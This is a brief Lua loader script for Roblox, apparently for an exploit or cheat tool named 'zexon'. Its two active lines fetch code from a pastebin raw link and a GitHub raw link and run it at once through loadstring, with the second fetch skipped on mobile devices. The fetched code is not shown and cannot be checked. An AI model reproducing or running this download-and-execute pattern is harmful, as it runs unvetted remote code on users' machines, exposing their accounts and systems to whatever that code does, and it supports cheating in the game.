local UserInputService = game:GetService("UserInputService")
loadstring(game:HttpGet('https://pastebin.com/raw/HYuVwnZK'))()
local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.MouseEnabled
end
if not isMobile() then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/a-guy-lol/program-project/refs/heads/main/zexonMain/zexon-source.lua'))()
end
